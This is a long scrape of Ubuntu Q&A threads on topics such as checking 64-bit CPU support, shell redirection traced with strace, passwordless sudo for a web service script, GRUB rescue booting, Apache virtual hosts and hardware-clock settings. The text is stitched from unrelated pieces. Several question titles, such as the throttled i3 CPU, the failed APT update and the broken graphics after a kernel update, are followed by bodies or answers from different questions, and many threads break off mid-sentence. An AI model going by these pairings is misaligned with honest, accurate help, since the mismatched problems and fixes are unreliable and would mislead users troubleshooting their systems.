Do a google search and there you will find something that says as to whether your CPU is 64-bit or not.\nFrom Intel:\n\n\nA: If you look at the CPU op-mode(s) line, you'll see a clue:\nCPU op-mode(s):       32-bit, 64bit\nSo yes, your CPU supports 64bit instructions. You can use the 64bit version of Ubuntu if you want to. This will require reinstalling, there is no upgrade path.\nMost CPUs you'll encounter —certainly from the last decade or so— will probably support 64bit. This isn't a guarantee because Intel still makes 132 32bit CPUs, however these are super-budget Atoms, Celerons and Pentiums, special-purpose Xeons and a few SoCs. AMD's offerings are similar.\nIf you can find out what the CPU is (i.e. read the Model name output), you end up with something very Google-able. Here is one of my servers:\nModel name:            Intel(R) Pentium(R) CPU G3220 @ 3.00GHz\n\nThat gives this Intel ARK page which tells you all the CPU features and supported architectures.

Which shows how redirection could be implemented so $ ls > ls.out could look like:\nmain(){\n    close(1); // Release fd no - 1\n    open(\"ls.out\", \"w\"); // Open a file with fd no = 1\n    // Child process\n    if (fork() == 0) {\n        exec(\"ls\"); \n    }\n}\n\n\nA: When evaluating the command the > redirection is resolved first: so by the time ls runs the output file has been created already.\nThis is also the reason why reading and writing to the same file using a > redirection within the same command truncates the file; by the time the command runs the file has been truncated already: \n$ echo foo >bar\n$ cat bar\nfoo\n$ <bar cat >bar\n$ cat bar\n$ \n\nTricks to avoid this:\n\n\n*\n\n*<<<\"$(ls)\" > ls.out (works for any command that needs to run before the redirection is resolved)\nThe command substitution is run before the outer command is evaluated, so ls is run before ls.out is created:\n$ ls\nbar  foo\n$ <<<\"$(ls)\" > ls.out\n$ cat ls.out \nbar\nfoo\n\n\n\n\n*\n\n*ls | sponge ls.out (works for any command that needs to run before the redirection is resolved)\nsponge writes to the file only when the rest of the pipe has finished executing, so ls is run before ls.out is created (sponge is provided with the moreutils package):\n$ ls\nbar  foo\n$ ls | sponge ls.out\n$ cat ls.out \nbar\nfoo\n\n\n\n\n*\n\n*ls * > ls.out (works for ls > ls.out's specific case)\nThe filename expansion is performed before the redirection is resolved, so ls will run on its arguments, which won't contain ls.out:\n$ ls\nbar  foo\n$ ls * > ls.out\n$ cat ls.out \nbar\nfoo\n$\n\n\nOn why redirections are resolved before the program / script / whatever is run, I don't see a specific reason why it's mandatory to do so, but I see two reasons why it's better to do so:\n\n\n*\n\n*not redirecting STDIN beforehand would make the program / script / whatever hold until STDIN is redirected;\n\n*not redirecting STDOUT beforehand should necessarily make the shell buffer the program's / script's / whatever's output until STDOUT is redirected;\nSo a waste of time in the first case and a waste of time and memory in the second case.\nThis is just what occurs to me, I'm not claiming these are the actual reasons; but I guess that all in all, if one had a choice, they would go with redirecting before anyway for the abovementioned reasons.\n\nA: From man bash:\n\nREDIRECTION\nBefore a command is executed, its input and output  may  be  redirected\n    using  a special notation interpreted by the shell.  Redirection allows\n    commands' file handles to be duplicated, opened, closed, made to  refer\n    to different files, and can change the files the command reads from and\n    writes to.\n\nFirst sentence, suggests that output is made to go somewhere other than stdin with redirection right before the command is executed. Thus, in order to be redirected to file, file must first be created by the shell itself.\nTo avoid having a file, I suggest you redirect output to named pipe first, and then to file. Note the use of & to return control over terminal to the user\nDIR:/xieerqi\nskolodya@ubuntu:$ mkfifo /tmp/namedPipe.fifo                                                                         \n\nDIR:/xieerqi\nskolodya@ubuntu:$ ls > /tmp/namedPipe.fifo &\n[1] 14167\n\nDIR:/xieerqi\nskolodya@ubuntu:$ cat /tmp/namedPipe.fifo > ls.out\n\nBut why?\nThink about this  - where will be the output ? A program has functions like printf, sprintf , puts , which all by default go to stdout, but can their output be gone to file if file doesn't exist in the first place ? It's like water. Can you get a glass of water without putting glass underneath the faucet first ?\n\nA: I don't disagree with the current answers. The output file has to be opened before the command runs or the command won't have anywhere to write its output.\nThis is because \"everything is a file\" in our world. Output to screen is SDOUT (aka file descriptor 1). For an application to write to the terminal, it opens fd1 and writes to it like a file.\nWhen you redirect an application's output in a shell, you're altering fd1 so it's actually pointing at the file. When you pipe you alter one application's STDOUT to become another's STDIN (fd0).\n\nBut it's all nice saying that, but you can quite easily look at how this works with strace. It's pretty heavy stuff but this example is quite short.\nstrace sh -c \"ls > ls.out\" 2> strace.out\n\nWithin strace.out we can see the following highlights:\nopen(\"ls.out\", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 3\n\nThis opens ls.out as fd3. Write only. Truncates (overwrites) if exists, otherwise creates.\nfcntl(1, F_DUPFD, 10)                   = 10\nclose(1)                                = 0\nfcntl(10, F_SETFD, FD_CLOEXEC)          = 0\ndup2(3, 1)                              = 1\nclose(3)                                = 0\n\nThis is a bit of juggling. We shunt STDOUT (fd1) off to fd10 and close it off. This is because we're not outputting anything to the real STDOUT with this command. It finishes by duplicating the write handle to ls.out and closing the original one.\nstat(\"/opt/wine-staging/bin/ls\", 0x7ffc6bf028c0) = -1 ENOENT (No such file or directory)\nstat(\"/home/oli/bin/ls\", 0x7ffc6bf028c0) = -1 ENOENT (No such file or directory)\nstat(\"/usr/local/sbin/ls\", 0x7ffc6bf028c0) = -1 ENOENT (No such file or directory)\nstat(\"/usr/local/bin/ls\", 0x7ffc6bf028c0) = -1 ENOENT (No such file or directory)\nstat(\"/usr/sbin/ls\", 0x7ffc6bf028c0)    = -1 ENOENT (No such file or directory)\nstat(\"/usr/bin/ls\", 0x7ffc6bf028c0)     = -1 ENOENT (No such file or directory)\nstat(\"/sbin/ls\", 0x7ffc6bf028c0)        = -1 ENOENT (No such file or directory)\nstat(\"/bin/ls\", {st_mode=S_IFREG|0755, st_size=110080, ...}) = 0\n\nThis is it searching for the executable. A lesson perhaps to not have a long path ;)\nclone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7f0961324a10) = 31933\nwait4(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0, NULL) = 31933\n--- SIGCHLD {si_signo=SIGCHLD, si_code=CLD_EXITED, si_pid=31933, si_status=0, si_utime=0, si_stime=0} ---\nrt_sigreturn()                          = 31933\ndup2(10, 1)                             = 1\nclose(10)                               = 0\n\nThen the command runs and the parent waits. During this operation any STDOUT will have actually mapped to the open file handle on ls.out. When the child issues SIGCHLD, this tells the parent process its finished and that it can resume. It finishes off with a little more juggling and a close of ls.out.\nWhy is there so much juggling? No I'm not entirely sure either.\n\nOf course you can change this behaviour. You could buffer to memory wth something like sponge and that'll be invisible from the proceeding command. We're still affecting the file descriptors, but not in a file-system-visible way.\nls | sponge ls.out\n\n", "Q: i3 throttled at 500Mhz when battery under 30% I have the following problem.

The Pythonscript is part of a webservice on Apache2. Since it is part of a webservice, asking the user each time for the password is not an option, neither is giving full rights to the entire folder. \nThe command should execute a compiled C++ file (whose name is stored in the variable \"CMDexecutable\").

This directory is freely accessable over the web.\nNow, I have the following in my Pythonscript :\nPopen(os.path.join(rundir_temp,CMDexecutable),stdout=PIPE)\n\nThis does not execute the script I have. I can only execute the compiled C++ file by typing the following in the terminal while in the \"rundir_temp\" directory:\nsudo ./CMDexecutable\n\nEverything works perfectly then.\nHow can I give sudo rights to this command in my Pythonscript without hardcoding my password?\nI found this thread which discusses a very similar topic, but I just can't get it working... I'm new to both Python and Ubuntu, so probably overlooking a basic thing?\nI have Ubuntu 14.04 LTS and Python 2.7.6\nThanks in advance!!\n\nA: From your question, it is not fully clear if you need to be inside the directory of CMDexecutable (and thus cd first) or if the full path would do, but the only option I see is to add the script to the sudoers file, as described here. \nThen you can run the script with sudo, without having to enter the password.\nYou can simply run the (python) script then by the command\nsudo <script>\n\nas said, without being prompted for the password.\n(Very) important note\nIt is quite evident that you need to store the script in a location where it can not be edited without sudo privileges. Since the script can run without entering the password, you need to be sure its content is not changed by any other process or possibly malicious code.\nFurthermore, (might be superfluously, but since I do not know the exact context) for the same reason, you need to make absolutely sure that the CMDexecutable and everything it runs is no possible target for \"malicious alterations\".\nEdit\nSince you mention you cannot change the initial command to run your python script into a sudo command, you could do the following:\n\n*\n\n*Inside your python script, create a command to run a secondary script, run with sudo:\n  sudo <script>\n\n\n\n*Add this secondary script to the sudoers file, to run without password. This way, the python (main) script will run the command without having to enter the password.\nI'd like to stress however that this seems patchwork, and I have no insight in possible security risks. Make anyway sure all files, run from the thread of the first sudo command \"tree\" are no possible targets for malicious editing.\n", "Q: Failed to fetch APT update (Not a duplicate) I've already checked this, this and this answers, none of them works in my case.

I use Evolution for mailing, and I like how new mail notifications appear in GNOME 3 notification area at the top of the screen.  Unfortunately, it seems that Evolution must be running for this feature to work.\nAfter googling a bit, I found there is a mail-notification-evolution package, but it uses message tray and I can't even install it in Ubuntu 15.10 with GNOME 3.18.  Is there a better solution?\n\nA: This worked for me on Gnome 15.04:\nThis is a How-To for making Email Notifications work for Gnome & Evolution (or any other mail client)\nIt all started when I decided that having Evolution open all the time was a bit annoying. I like Evolution because it integrates well with Google Mail, Contacts & Calendars, as well as all my IMAP mail boxes and my Yahoo POP mailbox. I didn't want to change client. I am using Mail Notification 5.4 by Jean-Yves Lefort in Ubuntu. \nI could have minimised Evolution to the system tray and got mail notifications as they came in by using KDocker (KDocker tutorial) or AllTray but they didn't do quite what I wanted for one reason or another, for example, compatibility issues with Compiz.\nOpen Synaptic package Manager and search for \"mail-notification\", tick both mail-notification & mail-notification-evolution \nor in a terminal, type:\nsudo apt-get install mail-notification mail-notification-evolution\n\nOnce this is done, open Evolution and check the plugin is installed and active: Edit > Plugins > Jean-Yves Lefort's Mail Notification (make sure there is a tick next to it).\nNow you should find the configuration properties for mail notification - search the dash for \"mail notification\".\nThis is where you add your mailboxes, now, this is where things started going wrong and took a bit of working out. I added a mailbox by clicking 'Add', then on the option of 'Mailbox Type' I selected Evolution; of course, but it didn't work.\nTrying to add Evolution in Mail notify gave me the error \"Mail Notification can not contact Evolution. Make sure that Evolution is running and that the Evolution Jean-Yves Lefort's Mail Notification plugin is loaded.\" Both were true and so I tried to fix this problem, I read lots of bug reports and tried various 'fixes' all to no avail. \nThen I thought to myself, why not take Evolution out of the equation until it's needed? So I configured my IMAP & POP accounts directly, OK, it took a bit longer but totally worth it, here's how...\n\n\n*\n\n*Select mailbox type (e.g. IMAP, POP, Gmail, etc)\n\n*Fill in the General tab with mail server address, username/email address & password\n\n*Click TAB called 'Connection' and select Authentication Mechanism.\nIMPORTANT \nI changed the drop down menu to Cram-MD5 for mine, but select whatever Authentication method your provider uses, if you don't know, trial and error only takes a few seconds more. If you leave it on 'Autodetect' you will get an error saying 'Unhandled IMAP or POP mailbox (unable to encode Base64: overflowed buffer)' and it won't work. if you have the wrong authentication Mechanism you'll get the same error or it won't connect, straight forward.\n\n*Select the 'Details' Tab and changed the name of your mailbox if you want to, this is just what your Mailbox is identified as in the list, I called mine by the email address i.e. chris@blahblah.blah\n\n*Apply,OK \n...and thats it for that part.\nNow send yourself a test email to the address you just configured and you'll get a notification! \nMail Reader\nIf you right-click the mail icon, the first option is 'Mail Reader' and when you click it, what's supposed to happen is your Mail Reader (Evolution) opens up so you can read and reply to the email, mine didn't do anything. \nThe reason, I found out, was because it was trying to open Thunderbird... I found out by opening a terminal and typing:\ntail -n 0 -f ~/.xsession-errors\nThen clicking the 'Mail Reader' option. The output told me that the 'click' called Thunderbird.\nTo set the correct Mail Client, on the desktop taskbar, click open: System > Preferences > Preferred Applications\nUnder the Mail Reader section in the 'Command' box, type in Evolution, or the path to Evolution, i.e. /usr/bin/evolution\nYou might want to add options to it, you can check what options are available on the man page:\nman evolution\n\nFinally, close the Preferred Applications dialog and you're done, email notifications without Evolution being open.\n", "Q: xdotool, open and close Unity Dash on startup on Ubuntu 14.04 the first Unity Dash search is much slower than the following searches.\nWith xdotool I'm trying to open and then close the Unity Dash user interface on Ubuntu start-up.\n~/.config/autostart/unity_dash_update.desktop\n[Desktop Entry]\nType=Application\nExec=~/.config/autostart/unity_dash_update.sh\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[it]=Unity Dash Update\nName=Unity Dash Update\nComment[it]=\nComment=\n\n~/.config/autostart/unity_dash_update.sh\n#!/bin/bash\nsleep 1\nxdotool key Alt+F2\nsleep 3\nwindow=\"$(xdotool getactivewindow)\"\nxdotool key --window $window \"Escape\"\nexit 0\n\nIf I manually run the bash script, the thing works, but during the system startup the Dash appears and doesn't disappear.\nI've tried with or without sleeping time between xdotool execution, with no success.\nWhat I am doing wrong?\nupdate\nAs  Jacob Vlijm suggests, the Exec parameter was wrong, 'cause it must be an absolute path.\nThis was my fault cause I tried a quick (too quick) way to remove my name from the code I was posting.\nI'm sorry.\nSo a corrected .desktop file would be\n[Desktop Entry]\nType=Application\nExec=/home/myname/.config/autostart/unity_dash_update.sh\nHidden=false\nNoDisplay=false\nX-GNOME-Autostart-enabled=true\nName[it]=Unity Dash Update\nName=Unity Dash Update\nComment[it]=\nComment=\n\nThanks Jacob for your help.\n\nA: dbus actually has a method for closing the Dash menu. Using qdbus your script could be changed as follows:\n#!/bin/bash\nDISPLAY=:0\nsleep 10\nxdotool key Alt+F2\nsleep 0.25 \nqdbus com.canonical.Unity /com/canonical/Unity/Dash \\\n      com.canonical.Unity.Dash.HideDash\nexit 0\n\nNote that in addition i've increased sleep time to 10 seconds, because Unity may take time to start up. Thus if Unity haven't started yet, that will make the script run commands, but those commands would have no effect.\n\nA: You have a few issues in your setup: one will definitely make it not work, the other most likely:\n1. The most important one:\nIn the .desktop file, you use:\nExec=~/.config/autostart/unity_dash_update.sh\n\nbut ~ does not work ina a .desktop file, you need to use absolute path, unless your script is in $PATH (and executable), then simply run it by its name.\n2. Most likely, you need to set a break before the command runs\nNow it simply runs too early and will either break, or miss target. This is often the case with:\n\n\n*\n\n*touchpad, mouse and keyboard (settings) related commands.\n\n*xrandr commands, especially when a second monitor is attached\n\n*Indicators\n\n\nand a few more... Unity related commands are in the list by definition, since it is desktop related by nature.\nConcluding: change your Exec= line into:\nExec=/bin/bash -c \"sleep 15 && /absolute/path/to/unity_dash_update.sh\n\n\nEDIT\nImportant Notes\n\n\n*\n\n*In your question, you mention \"Unity Dash search is much slower\". However, your xdotool command does not call Unity Search, but the command entry. To call Unity Search simply (virtually) press Super is sufficient. Then make the script:\nxdotool key Super && sleep 3 && xdotool key Super\n\nOr better, don't use a script at all, and add this to startup applications, including the break you need before it to run:\n/bin/bash -c \"sleep 15 && xdotool key Super && sleep 3 && xdotool key Super\"\n\nOf course you can experiment with the sleep 15 time.\n\n*Your .desktop file is quite extended, while for a basic job like running a script on startup:\n[Desktop Entry]\nName=name\nExec=command\nType=Application\n\nis sufficient. \nIf you use less, less can go wrong :)\nSee also here.\n\n*If you insist on using a separate script, don't store it in ~/.config/autostart. That directory is specifically meant for startup (log in) launchers.\n", "Q: How can I increase Ubuntu's 143-byte file name limit for encrypted directories? In encrypted directories, Ubuntu (at least 15.10) seems to have a file name byte limit of 143 B--much smaller than the ext4 file system's limit of 255 B. Where is this special limit set, why is it set in the first place, and is there a way to increase it?\n\nA: \nWhere is the Ubuntu limit set, \n\nIt is a filesystem limit. All \"ext\" have a 255 chars limit. Here is a list of a lot of filesystems. ReiserFS shows 4032 bytes (but it is limited to 255 chars because of Linux VFS).\nThe 144 char limit for encypted file is incorrect. It is 143 (from the creator of ecryptfs utilities). The remaining chars are needed for the encrypting so you can not go over it (encryption does not work on files with more than 143 chars).\n\nand is there a way to increase it?\n\nNo\n\nSome more info. These will show file and directory size limit in chars: \n getconf NAME_MAX /dev/sda\n getconf PATH_MAX /dev/sda\n\n\nSee /usr/include/linux/limits.h for the declaration of these 2 variables:\n#ifndef _LINUX_LIMITS_H\n#define _LINUX_LIMITS_H\n\n#define NR_OPEN         1024\n\n#define NGROUPS_MAX    65536    /* supplemental group IDs are available */\n#define ARG_MAX       131072    /* # bytes of args + environ for exec() */\n#define LINK_MAX         127    /* # links a file may have */\n#define MAX_CANON        255    /* size of the canonical input queue */\n#define MAX_INPUT        255    /* size of the type-ahead buffer */\n#define NAME_MAX         255    /* # chars in a file name */\n#define PATH_MAX        4096    /* # chars in a path name including nul */\n#define PIPE_BUF        4096    /* # bytes in atomic write to a pipe */\n#define XATTR_NAME_MAX   255    /* # chars in an extended attribute name */\n#define XATTR_SIZE_MAX 65536    /* size of an extended attribute value (64k) */\n#define XATTR_LIST_MAX 65536    /* size of extended attribute namelist (64k) */\n\n#define RTSIG_MAX     32\n\n#endif\n\nYou can change this value but you will need to recompile at least the fopen() function for it to be usable. And there will be no compatibility with any other operating systems.\nSo I change my answer to: Yes you can but please do not :)\n", "Q: git showing version 1.9.1 when installing from apt-get and source I tried install git via apt-get install git, and from source using these instructions:\nhttps://www.digitalocean.com/community/tutorials/how-to-install-git-on-ubuntu-14-04\nEither way, if I type in git --version, it says I have 1.9.1, instead of 2.7, which is the latest version.\nI tried to purge git, but on re-install, it is still version 1.9.1\nAny ideas on what I did wrong?\n\nA: If you need the latest version:\nsudo apt-get autoremove --purge git\n\nThen recompile git and reinstall using the instructions (not with apt-get).

I've tested them with two monitors, the computer monitor and big screen tv.  And I've tested them with three operating systems between the two: Raspbian (based on Debian-Jessie GNU-Linux).  AND I've got one machine where the HDMI sound does work, my Intel NUC core i3 that's connected to the above computer monitor). \n--EDIT-- Is it possible that some HDMI video cards do not support sound over their HDMI?\n\nA: I am guessing that the problem is that distro doesn't automatically change sound configuration - HDMI requires digital output which is not set automatically and although you have connected TV to PC's HDMI jack, there is no output to it. That was the problem in my case (and still is). I found out that it's a software issue because HDMI sound worked fine when I run Windows, but not under Linux Mint XFCE.\nSo now, every time I connect my laptop to a TV, I have to do go to Volume control/Configuration tab and select \"Digital Stereo (HDMI) output\" to enable audio.\nThere is more than one option that involves HDMI (Stereo, Surround 5.1, Surround 5.1 + Analog Stereo Input), so feel free to try every one of them until you hopefully find one that works. Note that I am using ALSA driver and that I can only access Volume Control via task bar (or whatever it is called) icon or via separate launcher in App Menu - there is no Sound entry in Settings Manager.\nI hope this will help you.\n", "Q: Round cube login connection to storage server failed I have multiple domains working on my mail server, and all are working normally,\nI configured new mail domain \"newdomain.ae\" normally on mysql mail db, created new user, inbox was created on server,\nBut when i tried to login to my account on the new mail on round cube, i got the error \"login connection to storage server failed\"\nRound cube's logs were:\n[01-Feb-2016 23:00:01 +0200]: IMAP Error: Login failed for myaccount@newdomain.ae from 2.2.2.2.

For this purpose, I have installed an additional empty hard drive (the drive containing Windows is fully partitioned and should remain unchanged).\nI am unsure, if I can select \"Automatically install Ubuntu next to Windows\" in the installation menu: Will it use the empty hard drive or reformat empty space on the Windows drive? Will the bootloader be installed on the correct drive so that both systems can be booted from their specific hard drives?\nEdit: I have successfully installed Ubuntu manually in the past. However, in this case I was not sure, if the bootloader will automatically recognise the second OS. The linked thread does not explain particularities when installing Ubuntu on a second drive next to another OS (just on the same drive or on a new drive by itself), where is the bootloader installed optimally? Will it automatically setup a boot option for the Windows drive without specifying it on installation?\nAlso, I am trying to understand by which logic the automatic installation will select the drives or partitions.\n\nA: I would rather choose the manual partitioning, then choose the Ubuntu hard disk.\nThe bootloader will be installed on the disk where you decide to install Ubuntu, which should be the 1st boot device in the bios (or uefi). Grub will let you choose between linux and windows.\nAs David pointed out, please have a look at How to use manual partitioning during installation? for more details on manual partitioning.\n", "Q: Ubuntu 14.04.3 LTS x64 HP zbook UEFI nvidia driver I have an HP Zbook running Ubuntu-gnome 14.04.3 LTS x64.

I recommend you look through the firmware's options to see if there's one to reset its options to the factory defaults. (Such an option usually exists.) If so, use it, then try either running Boot Repair again or re-install rEFInd (boot to Ubuntu in any way you can and run sudo refind-install). The idea here is that EFIs sometimes go \"out to lunch\" when cruft builds up in their NVRAM settings, and resetting them to the defaults sometimes revives them.\nIf that fails, look at the EFI/Boot directory on the ESP (that is, /boot/efi/EFI/Boot in Ubuntu) in more detail. Your Boot Repair output shows that this directory exists and holds a bootx64.efi file. This program should be launched as a fallback when everything else fails, but clearly you're not getting to GRUB. Other files in the directory might provide a hint about what the bootx64.efi file is -- there may be a configuration file or well-known filename. It could be that EFI/Boot/bootx64.efi a leftover Microsoft program, which could help explain things; deleting it might be in order in that case. You could also try putting either GRUB or rEFInd there -- copy the EFI/ubuntu or EFI/refind directory to EFI/Boot and then rename the boot loader (grubx64.efi or refind_x64.efi) to bootx64.efi. The result should be a system that boots.\n", "Q: How can I determine if a process has a window, and subsequently show, hide or close it? Is it possible, either through a shell script or terminal command, assuming you have the PID, determine if it has a main window (form), and then get info about it (title) and show/hide/close it?\n\nA: Script to look up possible window(s) of given pid, then show, minimize or close it\nSince you mention the command line, the script below runs in a terminal window. You run it with the pid as an argument, e.g.:\npython3 /path/to/script.py 1234\n\nSubsequently, a window (list) appears, of which you can choose a (list-) number and type an option to perform on it:\nCurrent Windows for pid 2189:\n------------------------------------------------------------\n[1] Niet-opgeslagen document 1 - gedit\n[2] testbackup.py (~/Bureaublad) - gedit\n\n------------------------------------------------------------\nType window number + option:\n-k  [kill (gracfully)]\n-m  [minimize]\n-s  [show]\nPress <Enter> to cancel\n------------------------------------------------------------\n1 -k\n\nIf there are no windows:\nThere are no windows for pid 1234\n\nThe script\n#!/usr/bin/env python3\nimport subprocess\nimport sys\n\npid = sys.argv[1]\n\nmessage = \"\"\"\n------------------------------------------------------------\nType window number + option:\n-k  [kill (gracfully)]\n-m  [minimize]\n-s  s[how]\n<Enter> to cancel\n------------------------------------------------------------\n\"\"\"\n# just a helper function\nget = lambda cmd: subprocess.check_output(cmd).decode(\"utf-8\").strip()\n# get the window list\nwlist = [l.split()[0] for l in get([\"wmctrl\", \"-lp\"]).splitlines() if pid in l]\n# create a indexed list of window name, id\nwdata = [[i+1, get([\"xdotool\", \"getwindowname\", w_id]), w_id] \\\n         for i, w_id in enumerate(wlist)]\n\n# if the list is not empty (windows exist)\nif wdata:\n    # print the window list\n    print(\"\\nCurrent Windows for pid \"+pid+\":\\n\"+\"-\"*60)\n    for item in wdata:\n        print(\"[\"+str(item[0])+\"]\", item[1])\n    # ask for user input (see \"message\" at the top)\n    action = input(message)\n    action = action.split()\n    # run the chosen action\n    try:\n        subj = [item[2] for item in wdata if item[0] == int(action[0])][0]\n        options = [\"-k\", \"-m\", \"-s\"]; option = options.index(action[1])\n        command = [\n            [\"wmctrl\", \"-ic\", subj],\n            [\"xdotool\", \"windowminimize\", subj],\n            [\"wmctrl\", \"-ia\", subj],\n            ][option]\n        subprocess.Popen(command)    \n    except (IndexError, ValueError):\n        pass\nelse:\n    print(\"There are no windows for pid\", pid)\n\nHow to use\n\n\n*\n\n*The script uses both xdotool and wmctrl:\nsudo apt-get install wmctrl xdotool\n\n\n*Copy the script into an empty file, save it as get_wlist.py\n\n*Run it with the command:\npython3 /path/to/get_wlist.py <pid>\n\nExplanation on the procedure\n\nAbout xdotool and wmctrl:\nTo manipulate, move or close windows, there are two important tools on Linux: xdotool and wmctrl. Of these two, xdotool is probably the most robust one, which I prefer in general. Although the options of both tools overlap, they do complete each other however, and to create a window list we simply need wmctrl.\nIn most cases therefore, I end up using a mixture of both tools.\n\nWhat the script does:\n\n\n*\n\n*The script gets the currently opened window list, using the command:\nwmctrl -lp\n\nWhich gives us information on both the window id and the pid it belongs to, with an output, looking like: \n0x05a03ecc  0 2189   jacob-System-Product-Name Niet-opgeslagen document 1 - gedit\n\n\n*The script then filters out the windows, belonging to the corresponding pid, looks up the window name with the xdotool command:\nxdotool getwindowname <window_id>\n\nand displays the found windows by name. Under the hood, these windows are numbered. \n\n*subsequently, if the user types a number + an option, the corresponding action is performed on the chosen window:\nwmctrl -ic <window_id>\n\nto close the window gracefully, or \nxdotool windowminimize <window_id>\n\nto minimize the chosen window, or \nwmctrl -ia <window_id>\n\nto raise the window.\n", "Q: How do I become an Ubuntu Partner so I can build devices?

I have searched all over the web no luck :/. I really want to be able to access my windows OS.\n\nA: It's easy to solve, but you need some tools before you can do it:\n\n\n*\n\n*A Linux system with GRUB. A Live media should do it;\n\n*A spare USB drive (backup the data from it).\nFirst, boot into the Linux system (it must have GRUB installed!). Use a tool such as GParted to format your USB drive as ext2. It must be ext2*!\nWhen using GParted you should get your USB drive's device file path (should be something like /dev/sdb1). Take note of it, we'll use it.\nOpen a terminal window and run:\nsudo umount -l /dev/sdb1\nReplacing /dev/sdb1 with whatever you took note of. If the above command throws you an error such as \"device is not mounted\" just ignore it.\nsudo mount /dev/sdb1 /mnt\nsudo grub-install --root-partition=/mnt /dev/sdb\nReplace /dev/sdb with what you took note of, but do not put the number (which is probably 1) in the end of the path. Also note the space between /mnt and /dev/sdb.\nsudo umount /dev/sdb1\nRemove the USB drive from the Linux box and plug it in your computer. Turn it on. When you see the grub rescue prompt, run\nls\nThat should show you all your drives/partitions. You'll have to find your USB drive. It will probably be (hd1,msdos1). Run ls (hd1,msdos1)/ (don't forget the /). If the output is boot/ then this is the correct partition. If you don't get this output, repeat with all the \"msdoses\" until you get it. Take note of the right one. I'll use (hd1,msdos1) as the example. Run:\nset prefix=(hd1,msdos1)/boot/grub\nthen\ninsmod chainload\ninsmod ntfs\nset root=(hdX,Y)\nHere, replace (hdX,Y) with your Windows partition (you should know its name already).\nchainloader +1\nboot\nThat should boot you into Windows. My mission ends here; you'll have to repair Windows' bootloader but that's none of this forum's business. Hint: look for EasyBCD.\nIf you can't repair Windows' bootloader for some reason, plug in your USB drive and repeat the last six commands in the grub rescue prompt to boot Windows.\n", "Q: Graphics broken after 4.2.0-27 update I was using Ubuntu 15.10, driver nvidia 358 from graphics-drivers PPA, my discrete card is GT-650M.\nSome time after said update, I had some ugly poligons and horizontal lines on my notebook, and everything froze.

Each file needs to be pretty much the same as this. However, you may want to remove the Rewrite lines if you don't have SSL enabled or you want to allow HTTP as well as HTTPS traffic. We see up at the top the two most important lines. ServerName and DocumentRoot. The ServerName field should be the domain that points to that DocumentRoot path. So, you will need two configuration files(four if you want www.domain1.com as well as domain1.com).\ncd /etc/apache2/sites-available/\ntouch site1.conf\ntouch site2.conf\n\nThen, in your preferred editor, copy and paste my example configuration file, making the two edits (three if you count setting it to your email, four if you take out those rewrite lines) into each of site1.conf and site2.conf.\nsudo a2ensite site1 site2\nsudo service apache2 restart\n\nThat will enable the two sites and redirect the URLs accordingly.\n\nA: http://www.unixmen.com/setup-apache-virtual-hosts-on-ubuntu-15-10/\nFinally these instructions worked for me\n\nA: I assume that you have already changed the A record of the domain to your server's IP address.\nNow, let's say you have two websites exampleone.in and exampletwo.in. And the default website is exampleone.in. So, the default host path to exampleone.in would be /var/www/html. Then in order to host exampletwo.in create a folder named exampletwo.in inside /var/www/ or opposite to html folder.\nSo, now you have two folders named as html and exampletwo.in inside /var/www.\nApache handles websites through .conf file inside /etc/apache2/sites-available/. So, fire-up your terminal and enter the following commands. Use sudo if required\ncd /etc/apache2/sites-available/\ntouch exampletwo.conf\n\nNow, open your favourite editor or use nano to change the content of exampletwo.conf to -\n    <VirtualHost *:80>\n        # The ServerName directive sets the request scheme, hostname and port that\n        # the server uses to identify itself.

I looked online and there should be an option that says free space but it isnt there. Any advice would be appreciated This is for a dual boot on windows 7 btw.\n\n\nA: Boot back into Windows and use the Disk Management tool (search for \"partition\" in the start menu) to \"shrink\" one of the discs.  That will create the free space that you can use to install Ubuntu. I always use the Windows tools to resize discs on a windows machine.  It helps reduce the possibility of data loss.\nhowtogeek.com has a nice tutorial on how to use the Disk Management tool.\n\nA: You have a lot of space in /dev/sda2 which is of type ntfs. I will say either create a new partition while installing Ubuntu or go back to Windows. Under Disk management - create some space for Ububtu. To be very simple you just need around 10 GB+ kind of space for Ubuntu...Ubuntu installer can then create / and swap partition for you automatically and then you can install ubuntu.\nWhat is that /dev/sdb? Is it the live USB or CD?

Is it the primary that is always mirrored onto the secondary? \nWhat happens when the primary resolution isnt supported by the secondary? Does it switch to the closest shared resolution?\n\nA: When you mirror displays in Ubuntu, the OS behaves like you have one monitor.\nIf you had extended displays before, any files shown on the secondary monitor will be moved to the primary (and only) monitor.\nIf one monitor can't support the other's resolution, Ubuntu will set it to the highest possible common resolution. This can result in stretching or black bars, depending on your video card and monitors.\n", "Q: How to check if hardware clock is in UTC or Local time From what I've read the hwclock -r command only returns the time in local time no matter how it is set.

But I don't want to change it; I want to know how it is currently set.\nSo how can I check if my hardware clock is set to UTC time or local time?\n\nA: Ubuntu 15.04 and later uses systemd as the default init system and includes the timedatectl program.  Running timedatectl will output:\n      Local time: Tue 2016-02-02 09:47:54 MST\n  Universal time: Tue 2016-02-02 16:47:54 UTC\n        RTC time: Tue 2016-02-02 16:47:54\n       Time zone: America/Denver (MST, -0700)\n Network time on: yes\nNTP synchronized: no\n RTC in local TZ: no\n\nRTC time is the hardware clock. Compare it to the Local time and Universal times returned by timedatectl to determine how the hardware clock is set.\nRTC in local TZ: no means the hardware clock is interpreted as UTC\nRTC in local TZ: yes means the hardware clock is interpreted as local time\nTo switch using timedatectl\nsudo timedatectl set-local-rtc 0 sets RTC to UTC\nsudo timedatectl set-local-rtc 1 sets RTC to local time\nSwitch using config file\nSetting the UTC= setting in /etc/default/rcS will change how the system interprets the hardware clock (UTC=yes or UTC=no).\n\nA: sudo hwclock --debug\n\nGives you the unmodified time before spitting out the interpreted (local or UTC) answer.\n", "Q: Constant noise in headphones Today a new problem cropped up in my HP Probook 430 G3 with Ubuntu 14.04.

(Nautilus is included with Ubuntu, Ubuntu GNOME and possibly Ubuntu MATE.)\nNavigate to the desired folder, hold down Shift, right click and select the Open Terminal Here option.\nIf you happen to use KDE, I believe that the same procedure will work.

